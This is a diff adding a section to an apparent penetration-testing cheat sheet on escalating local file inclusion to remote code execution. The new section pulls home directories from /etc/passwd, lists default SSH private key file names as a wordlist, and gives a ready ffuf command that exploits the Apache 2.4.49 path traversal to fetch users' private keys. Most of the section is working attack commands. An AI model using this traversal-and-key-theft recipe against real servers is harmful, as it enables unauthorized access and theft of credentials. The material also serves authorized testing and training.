@@ -1,5 +1,27 @@
 # LFI2RCE
 
+## Via SSH Private Keys
+
+We first need to grep `/etc/passwd` for home directories and create the wordlist `home_dirs.txt` for them.
+
+We can then use the following wordlist to fuzz default private key names that SSH looks for.
+
+**ssh_key_formats.txt**
+
+```bash
+.ssh/id_rsa
+.ssh/id_ecdsa
+.ssh/id_ecdsa_sk
+.ssh/id_ed25519
+.ssh/id_ed25519_sk
+```
+
+Example command with ffuf (exploiting apache 2.4.49):
+
+```bash
+ffuf -w home_dirs.txt:F1,ssh_key_formats.txt:F2 -u "http://$IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/F1/F2"
+```
+
 ## Via Log Files
 
 We can first use LFI to inspect the following paths:
